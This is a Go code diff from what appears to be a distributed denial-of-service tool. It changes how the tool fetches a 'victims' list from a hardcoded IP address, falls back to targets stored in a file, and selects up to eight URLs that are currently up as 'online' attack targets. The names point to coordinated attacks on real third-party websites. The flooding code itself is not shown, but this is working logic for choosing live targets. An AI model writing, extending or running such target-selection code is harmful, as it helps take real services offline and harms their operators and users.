@@ -6,6 +6,7 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os"
+	"strings"
 )
 
 func GetTargetsItArmyPpUa() (*TargetsItArmy, error) {
@@ -22,7 +23,6 @@ func GetTargetsItArmyPpUa() (*TargetsItArmy, error) {
 		fmt.Println("Could not get targets from api, using default targets from file...")
 		return t, nil
 	}
-
 	defer resp.Body.Close()
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
@@ -36,16 +36,20 @@ func GetTargetsItArmyPpUa() (*TargetsItArmy, error) {
 	return targets, nil
 }
 
-func GetTargets() (*Targets, error) {
+func GetTargets() (*TargetsItArmy, error) {
 	req, err := http.NewRequest("GET", "http://164.92.247.88:9300/victims", nil)
 	if err != nil {
 		return nil, err
 	}
 	resp, err := http.DefaultClient.Do(req)
 	if err != nil {
-		return nil, err
+		t, fErr := targetsFromFile()
+		if fErr != nil {
+			return nil, err
+		}
+		fmt.Println("Could not get targets from api, using default targets from file...")
+		return t, nil
 	}
-
 	defer resp.Body.Close()
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
@@ -56,7 +60,35 @@ func GetTargets() (*Targets, error) {
 	if err != nil {
 		return nil, err
 	}
-	return targets, nil
+	return sortTargets(targets), nil
+}
+
+func sortTargets(t *Targets) *TargetsItArmy {
+	// TODO sort on more criteria
+	onlineTargets := []*Statuses{}
+	targets := []string{}
+	for i := 0; i < len(t.Statuses); i++ {
+		if strings.Contains(t.Statuses[i].Status, "UP") {
+			onlineTargets = append(onlineTargets, &t.Statuses[i])
+		}
+	}
+	if len(onlineTargets) >= 8 {
+		for i := 0; i < 8; i++ {
+			if onlineTargets[i].URL != "" {
+				targets = append(targets, onlineTargets[i].URL)
+			}
+		}
+	} else {
+		for i := 0; i < len(onlineTargets); i++ {
+			if onlineTargets[i].URL != "" {
+				targets = append(targets, onlineTargets[i].URL)
+			}
+		}
+	}
+	return &TargetsItArmy{
+		Online:  targets,
+		Offline: nil,
+	}
 }
 
 func targetsFromFile() (*TargetsItArmy, error) {
